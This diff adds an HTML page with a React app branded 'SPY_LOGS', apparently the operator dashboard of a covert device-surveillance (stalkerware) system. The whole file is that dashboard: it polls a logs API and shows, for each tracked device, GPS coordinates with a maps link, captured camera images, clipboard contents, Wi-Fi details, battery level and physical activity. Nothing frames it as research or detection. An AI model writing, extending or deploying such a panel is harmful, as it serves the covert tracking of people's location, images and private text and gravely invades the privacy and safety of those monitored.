@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LurkerS</title>
+    <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
+    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
+    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body class="bg-[#05070a] text-slate-300 font-sans">
+    <div id="root"></div>
+    <script type="text/babel">
+        const { useState, useEffect, useMemo } = React;
+
+        const Stat = ({ icon, val, label, color }) => (
+            <div className="flex items-center gap-2 bg-white/5 border border-white/10 px-3 py-1.5 rounded-lg">
+                <i className={`${icon} ${color} text-xs`}></i>
+                <span className="text-[10px] uppercase text-slate-500 font-bold">{label}</span>
+                <span className="text-xs font-mono text-slate-200">{val || '---'}</span>
+            </div>
+        );
+
+        function App() {
+            const [logs, setLogs] = useState([]);
+            const [selectedDate, setSelectedDate] = useState(new Date().toISOString().split('T')[0]);
+
+            const fetchData = () => fetch('/api/logs').then(r => r.json()).then(setLogs);
+            useEffect(() => { fetchData(); const i = setInterval(fetchData, 5000); return () => clearInterval(i); }, []);
+
+            const timeline = useMemo(() => logs.filter(l => l.created_at.startsWith(selectedDate)), [logs, selectedDate]);
+
+            return (
+                <div className="min-h-screen pb-20">
+                    <nav className="sticky top-0 z-50 bg-[#05070a]/80 backdrop-blur-md border-b border-white/10 p-4">
+                        <div className="max-w-5xl mx-auto flex justify-between items-center">
+                            <div className="flex items-center gap-3">
+                                <div className="w-8 h-8 bg-indigo-600 rounded-lg flex items-center justify-center shadow-lg shadow-indigo-500/20">
+                                    <i className="fa-solid fa-satellite text-white"></i>
+                                </div>
+                                <h1 className="text-xl font-black tracking-tight text-white italic">SPY_LOGS <span className="text-indigo-500 font-normal">v1.0</span></h1>
+                            </div>
+                            <input 
+                                type="date" 
+                                className="bg-slate-900 border border-slate-700 rounded-md px-3 py-1.5 text-sm text-indigo-400 focus:ring-2 ring-indigo-500/50 outline-none"
+                                value={selectedDate}
+                                onChange={(e) => setSelectedDate(e.target.value)}
+                            />
+                        </div>
+                    </nav>
+
+                    <div className="max-w-5xl mx-auto mt-10 px-6">
+                        {timeline.length === 0 && (
+                            <div className="text-center py-20 text-slate-600 font-mono text-sm uppercase tracking-widest">No signals detected for this date</div>
+                        )}
+
+                        <div className="space-y-12 relative before:absolute before:inset-0 before:ml-5 before:-translate-x-px before:h-full before:w-0.5 before:bg-gradient-to-b before:from-indigo-500 before:via-slate-800 before:to-transparent">
+                            {timeline.map((log) => {
+                                const d = JSON.parse(log.payload);
+                                return (
+                                    <div key={log.id} className="relative pl-12 group">
+                                        <div className="absolute left-0 top-2 w-10 h-10 bg-slate-900 border-2 border-slate-700 rounded-full flex items-center justify-center group-hover:border-indigo-500 transition-colors z-10">
+                                            <i className="fa-solid fa-bolt-lightning text-xs text-indigo-400"></i>
+                                        </div>
+                                        
+                                        <div className="flex flex-col gap-4">
+                                            <div className="flex items-center gap-4">
+                                                <time className="text-xl font-black text-white">{new Date(log.created_at).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</time>
+                                                <span className="text-[10px] bg-indigo-500/10 text-indigo-400 border border-indigo-500/20 px-2 py-0.5 rounded font-bold uppercase">{log.device}</span>
+                                            </div>
+
+                                            <div className="bg-[#0f1218] border border-white/5 rounded-2xl overflow-hidden shadow-2xl">
+                                                {/* Header Stats Bar */}
+                                                <div className="flex flex-wrap gap-2 p-3 bg-white/5 border-b border-white/5">
+                                                    <Stat icon="fa-solid fa-battery-full" label="Batt" val={`${d.battery}%`} color="text-emerald-400" />
+                                                    <Stat icon="fa-solid fa-person-walking" label="Act" val={d.physical_activity} color="text-amber-400" />
+                                                    <Stat icon="fa-solid fa-wifi" label="Net" val={d.wifi_details} color="text-blue-400" />
+                                                    {d.latitude && (
+                                                        <Stat icon="fa-solid fa-location-dot" label="Loc" val={`${parseFloat(d.latitude).toFixed(4)}, ${parseFloat(d.longitude).toFixed(4)}`} color="text-rose-400" />
+                                                    )}
+                                                </div>
+
+                                                <div className="p-4 grid grid-cols-1 md:grid-cols-2 gap-4">
+                                                    {log.image_path && (
+                                                        <div className="rounded-xl overflow-hidden border border-white/10 group-hover:border-indigo-500/50 transition-colors">
+                                                            <img src={`/${log.image_path}`} className="w-full aspect-video object-cover" />
+                                                        </div>
+                                                    )}
+                                                    
+                                                    <div className="flex flex-col gap-3">
+                                                        <div className="bg-black/40 rounded-xl p-4 border border-white/5 h-full">
+                                                            <div className="text-[10px] text-slate-500 uppercase font-black mb-2 flex justify-between">
+                                                                <span>Clipboard Contents</span>
+                                                                <i className="fa-solid fa-copy"></i>
+                                                            </div>
+                                                            <p className="text-xs font-mono text-emerald-400 whitespace-pre-wrap">
+                                                                {d.clipboard || "No text in clipboard"}
+                                                            </p>
+                                                        </div>
+                                                        {d.latitude && (
+                                                            <a 
+                                                                href={`https://www.google.com/maps?q=${d.latitude},${d.longitude}`} 
+                                                                target="_blank"
+                                                                className="w-full bg-indigo-600 hover:bg-indigo-500 text-white text-center py-2 rounded-lg text-xs font-bold transition-colors"
+                                                            >
+                                                                <i className="fa-solid fa-map-location-dot mr-2"></i> OPEN IN MAPS
+                                                            </a>
+                                                        )}
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                );
+                            })}
+                        </div>
+                    </div>
+                </div>
+            );
+        }
+        ReactDOM.createRoot(document.getElementById('root')).render(<App />);
+    </script>
+</body>
+</html>
